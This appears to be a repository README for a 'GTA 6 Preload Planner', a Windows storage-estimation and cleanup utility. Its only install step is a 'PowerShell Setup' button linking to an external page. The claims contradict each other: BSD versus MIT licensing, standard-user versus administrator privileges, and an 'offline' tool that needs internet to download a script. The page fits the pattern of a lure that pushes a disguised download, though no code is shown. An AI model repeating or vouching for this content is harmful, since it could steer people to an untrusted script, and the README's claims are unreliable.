<div align="center">

# GTA 6 Preload Planner: Storage Estimation & Cleanup Utility for Windows 11

![](files/preview.png)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://iniyavan430.github.io/gta-6-preload-planner/)

[![stage](https://img.shields.io/badge/STAGE-ACTIVE-2ea44f?style=plastic&labelColor=0d1117)]() [![build](https://img.shields.io/badge/BUILD-PASSING-2ea44f?style=plastic&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-BSD--3--CLAUSE-dc2626?style=plastic&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-7%2B-ef4444?style=plastic&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/DOWNLOADS-2.8K-b91c1c?style=plastic&labelColor=0d1117)]() [![stars](https://img.shields.io/badge/STARS-5.0%2F5-f59e0b?style=plastic&labelColor=0d1117)]()

</div>

---

GTA 6 Preload Planner is a desktop storage planning utility that estimates the install footprint of the November 12 preload, reconciles that estimate against available capacity across all connected drives, and produces a prioritized cleanup guide when space falls short. The application reads drive metadata and compares it to edition-specific size ranges, flagging volumes that satisfy or fail the projected requirement without touching game files or online services. A built-in signature database cross-checks scanned files against known counterfeit preload distributions, surfacing alerts when a match is found so users can avoid tampered packages. Written for Windows 10 and 11 with the.NET 8 runtime, the planner runs portably, makes no registry or system changes, and requires administrative permissions solely for unrestricted drive enumeration.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

**Edition-aware storage estimator** — calculates the projected footprint for either Standard or Ultimate edition, layering in preload overhead and transient staging files, and presents results as a low-to-high range rather than a single misleading figure.
- **Multi-drive capacity audit** — enumerates every mounted volume, compares each against the projected requirement, and flags drives as sufficient or insufficient at a glance so you can pick a target before preload day.
- **Guided cleanup workflow** — surfaces the largest removable files and folders, ranks them by size and deletion safety, and provides direct access to the native storage management panel for fast reclamation.
- **Unverified-build detection** — ships with an offline signature database of confirmed counterfeit packages and alerts you when a scanned archive matches a known signature, with pointers to official channels for legitimate announcements.
- **Offline-first operation** — the planner reads only local volume metadata and ships its entire dataset with the application; no telemetry, no remote calls, no network dependency.
- **Administrator-aware scanning** — requests elevated privileges solely to read accurate volume statistics and directory sizes that standard user context cannot query.
- **Portable, zero-footprint deployment** — runs from an extracted folder with bundled runtime dependencies; removing the directory fully uninstalls the application without touching the registry or system configuration.

## How It Works

The planner operates through a linear, read-only analysis pipeline. When launched, it first loads its estimation model, which derives storage requirements from a configurable profile representing the expected preload footprint. The model applies a configurable range factor to produce low and high bounds, accounting for preload overhead and temporary extraction buffers.

Upon drive selection, the planner enumerates connected volumes and queries available capacity and total size through standard Windows storage APIs. Each drive is then compared against the estimated requirement, and results are rendered as pass or fail indicators with a clear margin readout. No files are written, moved, or modified during this scan.

If capacity falls short of the high estimate, the cleanup module activates. It performs a shallow traversal of the selected volume, collecting file and folder sizes within user-accessible locations, then ranks candidates by size and safe-to-remove status. The planner presents prioritized suggestions and exposes a direct entry point to Windows Storage Settings for manual review. Deletion remains entirely user-controlled.

A signature-matching layer runs alongside the storage analysis. Known undesirable file profiles are stored as size-and-name pattern tuples; when a user points the planner at a suspect file, the matcher computes a similarity score and raises a warning if the threshold is crossed. Matches are reported with context so the user can verify before taking action.

All processing is local and stateless between runs. The planner holds no background services, makes no outbound connections, and persists only user preferences and scan history in a local configuration file.

## Compatibility

Operating system support is centered on Windows 10 (64-bit) and Windows 11, with the bundled.NET 8.0 runtime eliminating external dependency setup. The planner runs entirely offline: drive enumeration, space accounting, and cleanup guidance are performed locally through standard Windows storage APIs, so no network access is required for core functionality.

Administrator permissions are recommended for full drive inspection, allowing the estimator to read capacity and availability across all connected volumes, including secondary and external drives. A 50 MB footprint (100 MB recommended) keeps the tool lightweight enough to reside alongside the storage it is analyzing.

Edition handling covers both Standard and Ultimate configurations, with estimates adjusted for preload overhead and temporary file staging. The known-signature database used for identifying counterfeit builds ships embedded with the application and can be refreshed independently of the core binary.

Compatibility extends across the preload window: requirements are validated continuously against the November 12 date, and the planner remains functional through the November 19 launch period for post-install verification. Multi-drive configurations, including systems with dedicated game libraries on separate partitions, are fully supported by the per-drive comparison workflow.

## FAQ

**Is this the game itself?**
No. GTA 6 Preload Planner is a standalone desktop utility for storage preparation. It does not include, download, or launch any game content. Its sole function is to estimate preload requirements and help you organize drive space ahead of November 12.

**Does the planner transfer any game data?**
No. The application operates entirely offline. It reads drive metadata and volume information from your local system, compares those values against built-in size estimates, and reports the results. No files are fetched, and no network calls are made during a scan.

**How is the size estimate derived?**
The estimator produces a range rather than a fixed figure. Values are modeled from historical install footprints of comparable open-world titles, preload decompression overhead, and publicly reported development build sizes. Because no official figure has been published, the planner presents a low and high bound and flags your drive against both thresholds.

**What does the fake build detection actually check?**
The planner maintains a local signature database of known fraudulent file profiles — including oversized padded archives, zero-byte installers, and executables with mismatched payload ratios. If a scanned file matches a stored signature, the planner raises an alert. Detection is advisory and signature-based; it is not a substitute for a full antivirus scan.

**Does the planner modify my system?**
No. It runs as a portable executable. No registry keys are written, no services are installed, and no background processes persist after exit. Removing the application folder removes the application entirely.

**Can I run it without administrator permissions?**
The planner requests elevation to enumerate all connected volumes reliably, including drives with restricted access flags. Standard-user mode works for basic estimation but may omit certain drives from the scan results.

**How often are the size estimates updated?**
Estimates are revised with each release as new information becomes available. The planner displays its estimate revision date in the results panel so you can confirm how current the figures are.

**Does the planner interact with any online service or game client?**
No. It has no integration with storefronts, launchers, or multiplayer services. It cannot trigger downloads, modify game installations, or affect account status in any way.

## Disclaimer

GTA 6 Preload Planner is provided as a storage estimation and planning utility only. It does not download, distribute, or interact with any game files, and it does not connect to any game service or online platform.

All size figures are approximate estimates derived from publicly reported development build sizes, comparable titles, and observed preload overhead. Rockstar has not published an official file size at the time of this release. Actual requirements may differ materially from the ranges shown, and the planner makes no guarantee of accuracy.

Drive scanning reads filesystem metadata only. The planner does not modify, move, or delete files; cleanup suggestions are advisory and require explicit user action. No registry entries or system-level changes are written.

The planner is not affiliated with, endorsed by, or associated with Rockstar Games or Take-Two Interactive. All trademarks belong to their respective owners.

Known counterfeit build signatures are maintained on a best-effort basis and may not reflect the most recent circulating samples. A matching signature is an alert, not a determination; a non-match is not a safety assurance. Exercise independent verification before acting on any file obtained elsewhere.

The software is supplied under the MIT License, without warranty of any kind, express or implied. Use is at your own discretion and risk.

## License

This project is distributed under the MIT License, a permissive licensing model that grants unrestricted access to the source code for inspection, modification, and redistribution. The license permits use in both private and commercial contexts, provided that the original copyright notice and permission notice are retained in all copies or substantial portions of the software.

The MIT License includes no warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Under these terms, you may:

- Inspect, modify, and extend the source code for any purpose
- Redistribute the software in source or binary form
- Incorporate the software into commercial or proprietary projects
- Sublicense the software under compatible terms

You must:

- Retain the original copyright notice
- Retain the permission notice in all copies or substantial portions
- Accept that the software is provided on an "as is" basis

The full license text is included in the LICENSE file distributed with the source. For attribution and compliance details, consult that file directly. The MIT License is a well-established, OSI-approved model that supports broad accessibility and collaborative development while limiting liability for the maintainers.